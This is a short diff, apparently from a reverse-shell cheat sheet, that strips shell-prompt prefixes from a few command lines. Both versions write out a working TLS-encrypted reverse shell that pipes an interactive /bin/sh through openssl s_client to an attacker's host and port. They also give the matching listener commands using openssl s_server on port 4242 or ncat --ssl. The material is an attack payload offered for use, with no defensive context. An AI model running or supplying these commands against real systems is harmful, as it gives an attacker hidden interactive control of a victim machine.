@@ -1,9 +1,9 @@
-user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $local_ip:$port> /tmp/s; rm /tmp/s
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $local_ip:$port> /tmp/s; rm /tmp/s
 
 # Listen with:
-hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
 
 # or
 
-hacker@kali$ ncat --ssl -vv -l -p $port
+ncat --ssl -vv -l -p $port
